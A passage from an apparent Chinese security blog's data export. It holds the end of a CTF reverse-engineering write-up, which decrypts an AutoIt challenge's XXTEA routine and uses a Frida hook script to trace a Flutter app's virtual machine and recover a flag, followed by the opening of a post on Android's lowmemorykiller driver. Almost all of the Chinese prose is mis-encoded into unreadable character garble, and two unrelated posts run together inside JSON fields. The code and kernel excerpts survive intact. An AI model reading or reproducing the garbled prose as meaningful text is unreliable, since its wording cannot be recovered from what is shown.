od ç›´æ¥é€†å‘ï¼Œé‚£ä¹ˆæ˜¯éœ€è¦èŠ±è´¹ä¸€æ®µæ—¶é—´åœ¨è¿™é¢˜ä¸Šçš„ã€‚å¹¶ä¸”æ ¹æ®å®˜æ–¹çš„è¯´æ³•ï¼Œåœ¨ v3.2.5.1 ä¹‹åçš„ autoit ç‰ˆæœ¬ä¸­å°†ä¸å†æ‹¥æœ‰è‡ªå¸¦çš„åç¼–è¯‘å·¥å…·ï¼Œæœ¬é¢˜æ‰€ä½¿ç”¨çš„ autoit ç‰ˆæœ¬åœ¨ v3.2.5.1 ä¹‹ä¸Šã€‚ ä¸è¿‡å¥½åœ¨å·²ç»æœ‰äººå¸®åŠ©æˆ‘ä»¬åˆ†æå‡ºäº†è™šæ‹ŸæŒ‡ä»¤å¯¹åº”çš„å«ä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨å·¥å…·å³å¯å¿«é€Ÿå¾—åˆ°æºç ã€‚ æŸ¥å£³ï¼Œè¿™æ˜¯ç”¨ autoit ç¼–è¯‘è€Œæˆçš„ exeï¼Œæ— å£³ã€‚ ä½¿ç”¨ AutoIt-Ripper å¾—åˆ°è¯¥ exe çš„æºç  https://github.com/nazywam/AutoIt-Ripper é€šè¿‡æœç´¢å­—ç¬¦ä¸² wrong å®šä½åˆ°å…³é”®å‡½æ•° åˆ†æåŠ å¯†æµç¨‹ï¼Œé¦–å…ˆåˆ¤æ–­è¾“å…¥æ˜¯å¦æ»¡è¶³ 38 ä½ï¼Œå¦‚æœæ»¡è¶³ï¼Œåˆ™å°†è¾“å…¥ç»è¿‡ ENC å‡½æ•°åŠ å¯†ï¼Œ ENC å‡½æ•°å¦‚ä¸‹ Func ENC ( $DATA , $KEY ) $DATA = Binary ( $DATA ) Local $DATALEN = BinaryLen ( $DATA ) If $DATALEN = 0 Then Return \"\" ElseIf $DATALEN &lt; 8 Then $DATALEN = 8 EndIf Local $OPCODE = \"0x83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000\" Local $CODEBUFFER = DllStructCreate ( \"byte[\" &amp; BinaryLen ( $OPCODE ) &amp; \"]\" ) DllStructSetData ( $CODEBUFFER , 1 , $OPCODE ) Local $V = DllStructCreate ( \"byte[\" &amp; Ceiling ( $DATALEN / 4 ) * 4 &amp; \"]\" ) DllStructSetData ( $V , 1 , $DATA ) Local $K = DllStructCreate ( \"byte[16]\" ) DllStructSetData ( $K , 1 , $KEY ) DllCall ( \"user32.dll\" , \"none\" , \"CallWindowProc\" , \"ptr\" , DllStructGetPtr ( $CODEBUFFER ) , \"ptr\" , DllStructGetPtr ( $V ) , \"int\" , Ceiling ( $DATALEN / 4 ) , \"ptr\" , DllStructGetPtr ( $K ) , \"int\" , 0 ) Local $RET = DllStructGetData ( $V , 1 ) $CODEBUFFER = 0 $V = 0 $K = 0 Return $RETEndFuncå¯ä»¥å‘ç°å‡½æ•°åŠ¨æ€åŠ è½½äº†ä¸€ä¸ª dll, ç„¶åä» dll è°ƒç”¨åŠ å¯†å‡½æ•°è¿›è¡ŒåŠ å¯† ä½¿ç”¨å¦‚ä¸‹è„šæœ¬å°† OPCODE ä»¥å­—èŠ‚çš„å½¢å¼å†™å…¥æ–‡ä»¶ï¼Œæ–¹ä¾¿ä½¿ç”¨ IDA è¿›è¡Œåˆ†æ import binasciiopcode = \"83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000\"hex_bytes = binascii.a2b_hex(opcode)with open(\"enc.dll\",'wb') as f: f.write(hex_bytes)ä¼ªä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°åŠ å¯†ç®—æ³•ä¸º xxtea ç¼–å†™ exp å¾—åˆ° flag import binasciifrom ctypes import *import structdef MX(z, y, total, key, p, e): temp1 = (z.value >> 5 ^ y.value &lt;&lt; 2) + (y.value >> 3 ^ z.value &lt;&lt; 4) temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def decrypt(n, v, key): delta = 0x61C88647 rounds = 6 + 52 // n total = c_uint32(-rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value += delta rounds -= 1 return vif __name__ == \"__main__\": ct = \"7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675\" ct = binascii.a2b_hex(ct) flag = \"\" key = \"Wowww111auUu3\" v = struct.unpack('&lt;10I', ct) k = struct.unpack('&lt;4I', key.encode() + b'\\x00' * 3) v = list(v) k = list(k) n = 10 res = decrypt(n, v, k) for r in res: print(r.to_bytes(4, 'little').decode(), end='')# vm_flutter è™½ç„¶è¿™ä¸ª apk æ˜¯ä½¿ç”¨ flutter ç¼–å†™çš„ï¼Œä½†æ˜¯å…¶å®åœ¨æœ¬é¢˜ä¸­ flutter ä»…ä»…æ˜¯çº¸è€è™èˆ¬çš„å­˜åœ¨ã€‚ åœ¨æœ¬é¢˜çš„é¢˜ç›®æè¿°ä¸­ç»™å‡ºäº†ä¸¤ä¸ªæç¤ºï¼Œç¬¬ä¸€æ˜¯å¯¹ flag çš„åŠ å¯†ç®—æ³•æœ‰ä¸”åªæœ‰ä¸€ä¸ª vmï¼Œç¬¬äºŒæ˜¯å…¨éƒ¨ vm ç›¸å…³çš„å‡½æ•°éƒ½å®šä¹‰åœ¨ Java å±‚ä¸­ï¼Œdart å±‚ä»…ä»…åªæ˜¯è°ƒç”¨ java å±‚ä¸­å®šä¹‰çš„å‡½æ•°ã€‚æ‰€ä»¥æ ¹æ®è¿™ä¸¤ä¸ªæç¤ºï¼Œå°±å¯ä»¥è”æƒ³åˆ°ä½¿ç”¨ frida ç­‰ hook æ¡†æ¶å» hook java å±‚ä¸­ vm ç›¸å…³çš„å‡½æ•°ï¼Œæ‰“å°å‡ºè™šæ‹ŸæŒ‡ä»¤æ¥è¿›è¡Œåˆ†æï¼Œå¦‚æœå¯ä»¥æƒ³åˆ°è¿™ä¸€ç‚¹ï¼Œé‚£ä¹ˆè¿™é¢˜å°±è¿åˆƒè€Œè§£äº†ã€‚å€˜è‹¥ä½¿ç”¨ reflutter ç­‰ flutter é€†å‘å·¥å…·ï¼Œé‚£ä¹ˆå°†ä¼šåœ¨ dart è™šæ‹Ÿæœºä¸­è¶Šé™·è¶Šæ·±ï¼š( åœ¨æœ¬é¢˜ä¸­ï¼Œopcode æ˜¯åœ¨ dart å±‚è¢«å®šä¹‰çš„ï¼Œä½†æ˜¯è¿™å…¶å®æ— å…³ç´§è¦ï¼Œå› ä¸º vm ç›¸å…³çš„å‡½æ•°æ˜¯åœ¨ java å±‚ä¸­å®šä¹‰çš„ï¼Œæˆ‘ä»¬å¯¹ vm å‡½æ•° hook çš„è¿‡ç¨‹å…¶å®å°±æ˜¯å¯¹ opcode çš„ â€œè§£è¯»â€ è¿‡ç¨‹ï¼Œé€šè¿‡ hook çš„æ“ä½œï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† vm å¯¹å†…éƒ¨æ ˆæˆ–å†…å­˜çš„æ“ä½œæ˜ å°„ä¸ºå¯è¯»çš„ã€å¯ä»¥ç†è§£çš„è™šæ‹ŸæŒ‡ä»¤æ¥è¿›è¡Œåˆ†æã€‚ æ‰€ä»¥è®¾è®¡æœ¬é¢˜ä¹Ÿæ˜¯åŸºäºè¿™ç§æ€æƒ³ï¼Œä½¿ç”¨ç›®å‰å®‰å“å±‚é¢é€†å‘éš¾åº¦éå¸¸é«˜çš„ flutter æ¡†æ¶ï¼Œæ¥æ¨¡æ‹Ÿç±»ä¼¼ vmprotect è¿™ç±»å¼ºå£³ opcode æœªçŸ¥çš„åœºæ™¯ï¼Œç”šè‡³åœ¨ vmprotect ä¸­ opcode ä¼šåœ¨é—´éš”ä¸å®šæ—¶é—´åéšæœºå˜æ¢ã€‚è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“ opcodeï¼Œä½†æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—ï¼Œvm è§£æ opcode ä¹‹åæœ€ç»ˆè¦æ‰§è¡Œçš„æ“ä½œæ˜¯ä¸ä¼šå˜çš„ã€‚ è·å– flag çš„è¿‡ç¨‹å¦‚ä¸‹ ä½¿ç”¨ jadx åç¼–è¯‘ï¼Œå‘ç°æ–¹æ³•åè¢«æ··æ·†ï¼Œä½†æ˜¯è¿›å…¥ com.dasctf.vm_flutter.vm_flutter.MainActivity å¯ä»¥çœ‹åˆ° vm ç›¸å…³çš„å­—ç¬¦ä¸² é€šè¿‡ç»™ c2 èµ‹ä¸åŒçš„å€¼æ¥è°ƒç”¨ vm ä¸­çš„å‡½æ•° æ ¹æ®å­—ç¬¦ä¸²çš„æç¤ºï¼Œæˆ‘ä»¬ä¾¿çŸ¥é“äº†è¢«æ··æ·†çš„ vm çš„å‡½æ•°éƒ½æ˜¯ä»€ä¹ˆå«ä¹‰ åŒæ—¶æˆ‘ä»¬è¿˜åœ¨è¿™é‡Œå‘ç°äº†æœ€ç»ˆçš„æ ¡éªŒå‡½æ•°ï¼Œå¯ä»¥æ¨æµ‹æœ€ç»ˆçš„ flag åº”è¯¥æœ‰ 33 ä½ ä½¿ç”¨ frida hook vm å‡½æ•°æ¥è·å– vm æŒ‡ä»¤ function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"k.b\"); activity.a.implementation = function()&#123; console.log(\"Lshift\"); &#125; activity.b.implementation = function()&#123; console.log(\"Rshift\"); &#125; activity.c.implementation = function()&#123; console.log(\"add\"); &#125; activity.d.implementation = function()&#123; console.log(\"and\"); &#125; activity.e.implementation = function(x)&#123; console.log(\"load \"+x); &#125; activity.f.implementation = function()&#123; console.log(\"mul\"); &#125; activity.g.implementation = function()&#123; console.log(\"or\"); &#125; activity.h.implementation = function()&#123; console.log(\"pop\"); &#125; activity.i.implementation = function(x)&#123; console.log(\"push \"+x); &#125; activity.j.implementation = function(x)&#123; console.log(\"store \"+x); &#125; activity.k.implementation = function()&#123; console.log(\"sub\"); &#125; activity.l.implementation = function()&#123; console.log(\"xor\"); &#125; &#125;)&#125;setImmediate(hook,0);ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æ³¨å…¥è„šæœ¬ frida -U -l .\\hook.js -f &quot;com.dasctf.vm_flutter.vm_flutter&quot; æˆ‘ä»¬è¾“å…¥ 33 ä½çš„æ•°å­—ï¼Œä¾‹å¦‚ 000000000000000000000000000000000 ,frida æ‰“å°çš„å†…å®¹å¦‚ä¸‹ push 48store 0push 176push 11load 0addxorstore 0push 48store 1push 198push 18load 1addxorstore 1push 48store 2push 66push 5load 2addxorstore 2push 48store 3push 199push 18load 3addxorstore 3push 48store 4push 170push 14load 4addxorstore 4push 48store 5push 32push 13load 5addxorstore 5push 48store 6push 31push 14load 6addxorstore 6push 48store 7push 60push 18load 7addxorstore 7push 48store 8push 26push 13load 8addxorstore 8push 48store 9push 89push 18load 9addxorstore 9push 48store 10push 60push 17load 10addxorstore 10push 48store 11push 119push 19load 11addxorstore 11push 48store 12push 60push 17load 12addxorstore 12push 48store 13push 90push 5load 13addxorstore 13push 48store 14push 104push 13load 14addxorstore 14push 48store 15push 174push 19load 15addxorstore 15push 48store 16push 146push 11load 16addxorstore 16push 48store 17push 179push 5load 17addxorstore 17push 48store 18push 67push 15load 18addxorstore 18push 48store 19push 73push 11load 19addxorstore 19push 48store 20push 50push 12load 20addxorstore 20push 48store 21push 92push 19load 21addxorstore 21push 48store 22push 170push 19load 22addxorstore 22push 48store 23push 160push 9load 23addxorstore 23push 48store 24push 166push 15load 24addxorstore 24push 48store 25push 47push 8load 25addxorstore 25push 48store 26push 155push 19load 26addxorstore 26push 48store 27push 115push 9load 27addxorstore 27push 48store 28push 60push 13load 28addxorstore 28push 48store 29push 52push 12load 29addxorstore 29push 48store 30push 42push 5load 30addxorstore 30push 48store 31push 96push 19load 31addxorstore 31push 48store 32push 72push 7load 32addxorstore 32åˆ†æä¸€ä¸‹ vm æŒ‡ä»¤ï¼Œè¿™é‡Œæœ‰ä¸ªç›¸åŒçš„ç»“æ„ï¼Œç»è¿‡åˆ†æåå¯ä»¥å‘ç°è¿™æ˜¯æ ‡å‡†çš„æ ˆå¼è™šæ‹Ÿæœºï¼Œå…ˆå°†æ“ä½œæ•°å‹å…¥æ ˆä¸­ï¼Œç„¶åè¿›è¡Œè¿ç®—æ—¶ä»æ ˆé¡¶å–å›ï¼Œæ‰€ä»¥æ­¤å¤„çš„ vm åŠ å¯†æ˜¯å¯¹è¾“å…¥åŠ ä¸Šä¸€ä¸ªæ•°ï¼Œå†å»å¼‚æˆ–ä¸€ä¸ªæ•° push 48store 0push 176push 11load 0addxorstore 0ç¼–å†™ exp å¾—åˆ° flag import reoutput = '''push 48store 0push 176push 11load 0addxorstore 0push 48store 1push 198push 18load 1addxorstore 1push 48store 2push 66push 5load 2addxorstore 2push 48store 3push 199push 18load 3addxorstore 3push 48store 4push 170push 14load 4addxorstore 4push 48store 5push 32push 13load 5addxorstore 5push 48store 6push 31push 14load 6addxorstore 6push 48store 7push 60push 18load 7addxorstore 7push 48store 8push 26push 13load 8addxorstore 8push 48store 9push 89push 18load 9addxorstore 9push 48store 10push 60push 17load 10addxorstore 10push 48store 11push 119push 19load 11addxorstore 11push 48store 12push 60push 17load 12addxorstore 12push 48store 13push 90push 5load 13addxorstore 13push 48store 14push 104push 13load 14addxorstore 14push 48store 15push 174push 19load 15addxorstore 15push 48store 16push 146push 11load 16addxorstore 16push 48store 17push 179push 5load 17addxorstore 17push 48store 18push 67push 15load 18addxorstore 18push 48store 19push 73push 11load 19addxorstore 19push 48store 20push 50push 12load 20addxorstore 20push 48store 21push 92push 19load 21addxorstore 21push 48store 22push 170push 19load 22addxorstore 22push 48store 23push 160push 9load 23addxorstore 23push 48store 24push 166push 15load 24addxorstore 24push 48store 25push 47push 8load 25addxorstore 25push 48store 26push 155push 19load 26addxorstore 26push 48store 27push 115push 9load 27addxorstore 27push 48store 28push 60push 13load 28addxorstore 28push 48store 29push 52push 12load 29addxorstore 29push 48store 30push 42push 5load 30addxorstore 30push 48store 31push 96push 19load 31addxorstore 31push 48store 32push 72push 7load 32addxorstore 32'''pattern = r'push\\s+(\\d+)'final = [255, 149, 26, 146, 200, 115, 150, 68, 36, 222, 185, 240, 74, 45, 4, 234, 236, 215, 62, 114, 178, 46, 205, 209, 214, 83, 233, 34, 82, 74, 67, 36, 204]matches = re.findall(pattern, output)#print(matches)for i in range(len(final)): print(chr((final[i] ^ (int(matches[i * 3 + 1]))) - int(matches[i * 3 + 2])), end='')","categories":[],"tags":[]},{"title":"lowmemorykilleråŸç†åˆ†æ","slug":"lowmemorykiller","date":"2023-10-10T07:40:53.000Z","updated":"2023-10-18T02:59:02.213Z","comments":true,"path":"lowmemorykiller/","link":"","permalink":"https://oacia.dev/lowmemorykiller/","excerpt":"","text":"# lowmemorykiller æ¦‚è¿° Android çš„è®¾è®¡ç†å¿µä¹‹ä¸€ï¼Œä¾¿æ˜¯åº”ç”¨ç¨‹åºé€€å‡ºï¼Œä½†è¿›ç¨‹è¿˜ä¼šç»§ç»­å­˜åœ¨ç³»ç»Ÿä»¥ä¾¿å†æ¬¡å¯åŠ¨æ—¶æé«˜å“åº”æ—¶é—´ã€‚è¿™æ ·çš„è®¾è®¡ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜åœ°å€ç©ºé—´ï¼Œéšç€åº”ç”¨æ‰“å¼€æ•°é‡çš„å¢å¤šï¼Œç³»ç»Ÿå·²ä½¿ç”¨çš„å†…å­˜è¶Šæ¥è¶Šå¤§ï¼Œå°±å¾ˆæœ‰å¯èƒ½å¯¼è‡´ç³»ç»Ÿå†…å­˜ä¸è¶³ï¼Œé‚£ä¹ˆéœ€è¦ä¸€ä¸ªèƒ½ç®¡ç†æ‰€æœ‰è¿›ç¨‹ï¼Œæ ¹æ®ä¸€å®šç­–ç•¥æ¥é‡Šæ”¾è¿›ç¨‹çš„ç­–ç•¥ï¼Œè¿™ä¾¿æœ‰äº† lmk ï¼Œå…¨ç§°ä¸º LowMemoryKiller (ä½å†…å­˜æ€æ‰‹)ï¼Œå®ƒä½¿ç”¨ lmkd æ¥å†³å®šä»€ä¹ˆæ—¶æœºæ€æ‰ä»€ä¹ˆè¿›ç¨‹. Android åŸºäº Linux çš„ç³»ç»Ÿï¼Œå…¶å® Linux æœ‰ç±»ä¼¼çš„å†…å­˜ç®¡ç†ç­–ç•¥ â€”â€”OOM killer (Out Of Memory Killer), OOM çš„ç­–ç•¥æ›´å¤šçš„æ˜¯ç”¨äºåˆ†é…å†…å­˜ä¸è¶³æ—¶è§¦å‘ï¼Œå°†å¾—åˆ†æœ€é«˜çš„è¿›ç¨‹æ€æ‰ã€‚è€Œ LowMemoryKiller åˆ™ä¼šæ¯éš”ä¸€æ®µæ—¶é—´æ£€æŸ¥ä¸€æ¬¡ï¼Œå½“ç³»ç»Ÿå‰©ä½™å¯ç”¨å†…å­˜è¾ƒä½æ—¶ï¼Œä¾¿ä¼šè§¦å‘æ€è¿›ç¨‹çš„ç­–ç•¥ï¼Œæ ¹æ®ä¸åŒçš„å‰©ä½™å†…å­˜æ¡£ä½æ¥æ¥é€‰æ‹©æ€ä¸åŒä¼˜å…ˆçº§çš„è¿›ç¨‹ï¼Œè€Œä¸æ˜¯ç­‰åˆ° OOM æ—¶å†æ¥æ€è¿›ç¨‹ï¼ŒçœŸæ­£ OOM æ—¶ç³»ç»Ÿå¯èƒ½å·²ç»å¤„äºå¼‚å¸¸çŠ¶æ€ï¼Œç³»ç»Ÿæ›´å¸Œæœ›çš„æ˜¯æœªé›¨ç»¸ç¼ªï¼Œåœ¨å†…å­˜å¾ˆä½æ—¶æ¥æ€æ‰ä¸€äº›ä¼˜å…ˆçº§è¾ƒä½çš„è¿›ç¨‹æ¥ä¿éšœåç»­æ“ä½œçš„é¡ºåˆ©è¿›è¡Œã€‚ ä¸ lowmemorykiller ç›¸å…³çš„æºç è·¯å¾„ msm-google\\drivers\\staging\\android\\lowmemorykiller.c# lowmemorykiller åŸºæœ¬åŸç† /* drivers/misc/lowmemorykiller.c * * The lowmemorykiller driver lets user-space specify (æŒ‡å®š) a set of memory thresholds (é˜ˆå€¼) * where processes with a range of oom_score_adj values will get killed. Specify * the minimum oom_score_adj values in * /sys/module/lowmemorykiller/parameters/adj and the number of free pages in * /sys/module/lowmemorykiller/parameters/minfree. Both files take a comma * separated list of numbers in ascending order (æŒ‰å‡åºåºåˆ—). * * For example, write \"0,8\" to /sys/module/lowmemorykiller/parameters/adj and * \"1024,4096\" to /sys/module/lowmemorykiller/parameters/minfree to kill * processes with a oom_score_adj value of 8 or higher when the free memory * drops below 4096 pages and kill processes with a oom_score_adj value of 0 or * higher when the free memory drops below 1024 pages. * * The driver considers memory used for caches to be free, but if a large * percentage of the cached memory is locked this can be very inaccurate (ä¸å‡†ç¡®) * and processes may not get killed until the normal oom killer is triggered. */æ‰€æœ‰åº”ç”¨è¿›ç¨‹éƒ½æ˜¯ä» zygote å­µåŒ–å‡ºæ¥çš„ï¼Œè®°å½•åœ¨ AMS ä¸­ mLruProcesses åˆ—è¡¨ä¸­ï¼Œç”± AMS è¿›è¡Œç»Ÿä¸€ç®¡ç†ï¼ŒAMS ä¸­ä¼šæ ¹æ®è¿›ç¨‹çš„çŠ¶æ€æ›´æ–°è¿›ç¨‹å¯¹åº”çš„ oom_adj å€¼ï¼Œè¿™ä¸ªå€¼ä¼šé€šè¿‡æ–‡ä»¶ä¼ é€’åˆ° kernel ä¸­å»ï¼Œkernel æœ‰ä¸ªä½å†…å­˜å›æ”¶æœºåˆ¶ï¼Œåœ¨å†…å­˜è¾¾åˆ°ä¸€å®šé˜€å€¼æ—¶ä¼šè§¦å‘æ¸…ç† oom_adj å€¼é«˜çš„è¿›ç¨‹è…¾å‡ºæ›´å¤šçš„å†…å­˜ç©ºé—´ï¼Œè¿™å°±æ˜¯ Lowmemorykiller å·¥ä½œåŸç†ã€‚ è¿™ä¸€å¼ å›¾å¾ˆå¥½çš„è¡¨ç¤ºäº† lmk çš„åŸç† ä½†å¯¹äºæˆ‘çš„ pixel3, å†…æ ¸ç‰ˆæœ¬ Linux4.9 æ¥è¯´æ²¡æœ‰ lowmemorykiller è¿™ä¸ªæ¨¡å— å¾€ä¸‹ç¿»äº†ç¿»æºç ï¼Œæ‰å‘ç°åŸæ¥ lowmemorykiller å·²ç»ä¸æ˜¯ä¸€ä¸ªæ¨¡å—äº† (å­˜ç–‘) å¹¶ä¸”è¿™äº›é˜ˆå€¼è¢«ç¡¬ç¼–ç åœ¨æºç ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•é€šè¿‡ä¿®æ”¹ /sys/module/lowmemorykiller/parameters/adj å’Œ /sys/module/lowmemorykiller/parameters/minfree æ¥æ”¹å˜ lowmemorykiller çš„æ€è¿›ç¨‹ç­–ç•¥ è§£é‡Šä¸€ä¸‹è¿™é‡Œå„ä¸ªå€¼çš„å«ä¹‰ï¼šå½“å†…å­˜ä½äº 64MB æ—¶ï¼Œç³»ç»Ÿä¼šæ€æ­» adj&gt;=12 çº§åˆ«çš„è¿›ç¨‹ï¼›å½“å†…å­˜ä½äº 16MB æ—¶ï¼Œç³»ç»Ÿä¼šæ€æ­» adj&gt;=6 çº§åˆ«çš„è¿›ç¨‹â€¦ ä»¥æ­¤ç±»æ¨ å¯¹äºåº”ç”¨è¿›ç¨‹æ¥è¯´ï¼Œéœ€è¦æœ‰è‡ªèº«çš„ adjï¼Œç”± AMS è´Ÿè´£æ›´æ–°ã€‚å®šä¹‰åœ¨ oom_adj å’Œ oom_score_adj æ–‡ä»¶ä¸­ï¼š /proc/pid/oom_adj ï¼šä»£è¡¨å½“å‰è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œè¿™ä¸ªä¼˜å…ˆçº§æ˜¯ kernel ä¸­çš„ä¼˜å…ˆçº§ï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ /proc/pid/oom_score_adj ï¼šè¿™ä¸ªæ˜¯ AMS ä¸Šå±‚çš„ä¼˜å…ˆçº§ï¼Œä¸ ProcessList ä¸­çš„ä¼˜å…ˆçº§å¯¹åº”ï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ å‰å°è¿›ç¨‹çš„ oom_adj ä¸º 0, oom_score_adj ä¹Ÿä¸º 0, è¡¨ç¤ºä¸å¯è¢«æ€æ­» blueline:/ # ps -A | grep ezu0_a243 16722 994 14961560 221328 SyS_epoll_wait 0 S com.example.ezandroidblueline:/ # cat /proc/16722/oom_adj0blueline:/ # cat /proc/16722/oom_score_adj0oom_adj å’Œ oom_score_adj çš„è½¬æ¢å…³ç³»ä¸º //msm-google\\drivers\\staging\\android\\lowmemorykiller.c/* * /proc/&lt;pid>/oom_score_adj set to OOM_SCORE_ADJ_MIN disables oom killing for * pid. */#define OOM_SCORE_ADJ_MIN (-1000)#define OOM_SCORE_ADJ_MAX 1000/* * /proc/&lt;pid>/oom_adj set to -17 protects from the oom killer for legacy * purposes. */#define OOM_DISABLE (-17)/* inclusive */#define OOM_ADJUST_MIN (-16)#define OOM_ADJUST_MAX 15static short lowmem_oom_adj_to_oom_score_adj(short oom_adj)&#123; if (oom_adj == OOM_ADJUST_MAX) return OOM_SCORE_ADJ_MAX; else return (oom_adj * OOM_SCORE_ADJ_MAX) / -OOM_DISABLE;&#125;# LowmemoryKiller æœºåˆ¶å‰–æ æ€»çš„æ¥è¯´ï¼ŒFramework å±‚é€šè¿‡è°ƒæ•´ adj çš„å€¼å’Œé˜ˆå€¼æ•°ç»„ï¼Œè¾“é€ç»™ kernel ä¸­çš„ lmkï¼Œä¸º lmk æä¾›æ€è¿›ç¨‹çš„ä¾æ®ï¼Œå› ä¸ºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ç›¸äº’éš”ç¦»ï¼Œå°±é‡‡ç”¨äº†æ–‡ä»¶èŠ‚ç‚¹è¿›è¡Œé€šè®¯ï¼Œç”¨ socket å°† adj çš„å€¼ä¸é˜ˆå€¼æ•°ç»„ä¼ ç»™ lmkd (5.0 ä¹‹åä¸åœ¨ç”± AMS ç›´æ¥ä¸ lmk é€šä¿¡ï¼Œå¼•å…¥ lmkd å®ˆæŠ¤è¿›ç¨‹)ï¼Œlmkd å°†è¿™äº›å€¼å†™åˆ°å†…æ ¸èŠ‚ç‚¹ä¸­ã€‚lmk é€šè¿‡è¯»å–è¿™äº›èŠ‚ç‚¹ï¼Œå®ç°è¿›ç¨‹çš„ killï¼Œæ‰€ä»¥æ•´ä¸ª lmk æœºåˆ¶å¤§æ¦‚å¯åˆ†æˆä¸‰å±‚ã€‚ # shrinker æœºåˆ¶ç®€ä»‹ LMK é©±åŠ¨é€šè¿‡æ³¨å†Œ shrinker æ¥å®ç°çš„ï¼Œshrinker æ˜¯ linux kernel æ ‡å‡†çš„å›æ”¶å†…å­˜ page çš„æœºåˆ¶ï¼Œç”±å†…æ ¸çº¿ç¨‹ kswapd è´Ÿè´£ç›‘æ§ã€‚ å½“å†…å­˜ä¸è¶³æ—¶ kswapd çº¿ç¨‹ä¼šéå†ä¸€å¼  shrinker é“¾è¡¨ï¼Œå¹¶å›è°ƒå·²æ³¨å†Œçš„ shrinker å‡½æ•°æ¥å›æ”¶å†…å­˜ pageï¼Œkswapd è¿˜ä¼šå‘¨æœŸæ€§å”¤é†’æ¥æ‰§è¡Œå†…å­˜æ“ä½œã€‚æ¯ä¸ª zone ç»´æŠ¤ active_list å’Œ inactive_list é“¾è¡¨ï¼Œå†…æ ¸æ ¹æ®é¡µé¢æ´»åŠ¨çŠ¶æ€å°† page åœ¨è¿™ä¸¤ä¸ªé“¾è¡¨ä¹‹é—´ç§»åŠ¨ï¼Œæœ€ç»ˆé€šè¿‡ shrink_slab å’Œ shrink_zone æ¥å›æ”¶å†…å­˜é¡µ # lowmemorykiller åˆå§‹åŒ– æ³¨å†Œ shrinker //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic struct shrinker lowmem_shrinker = &#123; .scan_objects = lowmem_scan, .count_objects = lowmem_count, .seeks = DEFAULT_SEEKS * 16&#125;;static int __init lowmem_init(void)&#123; register_shrinker(&amp;lowmem_shrinker); lmk_event_init(); return 0;&#125;å…¶ä¸­ shrinker ç»“æ„ä½“çš„å‚æ•°å¦‚ä¸‹ï¼Œå½“ count_objects è¿”å›é 0 å€¼æ—¶ä¼šè§¦å‘ scan_objects å›è°ƒå‡½æ•° //msm-google\\include\\linux\\shrinker.h/* * A callback you can register to apply pressure to ageable caches. * * @count_objects should return the number of freeable items in the cache. If * there are no objects to free or the number of freeable items cannot be * determined, it should return 0. No deadlock checks should be done during the * count callback - the shrinker relies on aggregating scan counts that couldn't * be executed due to potential deadlocks to be run at a later call when the * deadlock condition is no longer pending. * * @scan_objects will only be called if @count_objects returned a non-zero * value for the number of freeable objects. The callout should scan the cache * and attempt to free items from the cache. It should then return the number * of objects freed during the scan, or SHRINK_STOP if progress cannot be made * due to potential deadlocks. If SHRINK_STOP is returned, then no further * attempts to call the @scan_objects will be made from the current reclaim * context. * * @flags determine the shrinker abilities, like numa awareness */struct shrinker &#123; unsigned long (*count_objects)(struct shrinker *, struct shrink_control *sc); unsigned long (*scan_objects)(struct shrinker *, struct shrink_control *sc); int seeks; /* seeks to recreate an obj */ long batch; /* reclaim batch size, 0 = default */ unsigned long flags; /* These are for internal use */ struct list_head list; /* objs pending delete, per node */ atomic_long_t *nr_deferred;&#125;;# lowmem_count ç»Ÿè®¡ç¼“å­˜ //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic unsigned long lowmem_count(struct shrinker *s, struct shrink_control *sc)&#123; return global_node_page_state(NR_ACTIVE_ANON) + global_node_page_state(NR_ACTIVE_FILE) + global_node_page_state(NR_INACTIVE_ANON) + global_node_page_state(NR_INACTIVE_FILE);&#125; 